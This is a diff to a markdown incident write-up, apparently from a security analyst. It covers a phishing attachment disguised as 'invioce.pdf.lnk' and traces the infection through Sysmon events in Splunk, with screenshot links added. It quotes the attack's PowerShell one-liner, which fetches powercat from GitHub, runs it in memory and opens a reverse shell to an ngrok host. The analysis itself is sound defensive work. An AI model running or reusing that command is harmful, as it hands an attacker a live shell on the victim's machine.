@@ -18,10 +18,12 @@ I was working through a queue of alerts and hit one for a phishing email with an
 Since there was an attachment this time, I went to hash it before doing anything else — that's the safer habit over uploading a file directly to a sandbox. But `Get-FileHash` kept failing:
 
 ```
-Resolve-Path : Cannot find path 'C:\Users\Administrator\invioce.pdf' because it does not exist.
+![PowerShell error trying to hash the wrong filename](./screenshots/02-powershell-hash-error.png)
 ```
 
 Took me a minute to realize why: the file inside the zip wasn't actually a PDF at all. File Explorer showed the "Type" column as **Shortcut**, not PDF Document. Windows hides file extensions by default, so it displayed as `invioce.pdf` when the real name was `invioce.pdf.lnk` — a shortcut disguised as a document. Classic malware delivery trick.
+
+![File Explorer showing the disguised .lnk file](./screenshots/01-lnk-file-explorer-view.png)
 
 ## Pivoting in Splunk
 
@@ -34,13 +36,18 @@ index=* process.parent.pid=3728
 That single search surfaced the whole story:
 
 1. **13:29:12** — Outlook writes the zip to disk (email received/previewed)
-2. **13:29:23** — Explorer extracts it, the `.lnk` file appears
-3. **13:29:26** — PowerShell fires:
+![Sysmon event: Outlook writes the zip to disk](./screenshots/03-sysmon-file-created.png)
+
+3. **13:29:23** — Explorer extracts it, the `.lnk` file appears
+![Sysmon event: .lnk file revealed after extraction](./screenshots/04-sysmon-lnk-extracted.png)
+
+5. **13:29:26** — PowerShell fires:
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
 powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
 ```
+![Sysmon event: PowerShell establishes C2 connection](./screenshots/05-powershell-c2-connection.png)
 
 That line downloads a hacking tool called powercat straight from GitHub and runs it **in memory** — nothing gets saved to disk, which is exactly why this kind of attack slips past traditional antivirus. Once it runs, it opens a connection out to `2.tcp.ngrok.io`, and the attacker now has a live PowerShell shell on the machine.
 
